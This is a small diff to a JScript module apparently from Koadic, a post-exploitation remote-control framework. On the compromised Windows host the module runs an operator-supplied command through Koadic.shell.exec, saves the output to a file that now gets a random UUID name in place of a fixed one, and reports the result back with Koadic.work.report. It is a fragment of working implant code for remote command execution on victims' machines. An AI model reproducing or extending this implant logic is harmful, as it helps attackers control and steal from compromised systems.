@@ -1,6 +1,6 @@
 try
 {
-    var output = Koadic.shell.exec("~CMD~", "~DIRECTORY~\\~FILE~.txt");
+    var output = Koadic.shell.exec("~CMD~", "~DIRECTORY~\\"+Koadic.uuid()+".txt");
     if (output != "")
     {
       Koadic.work.report(output);
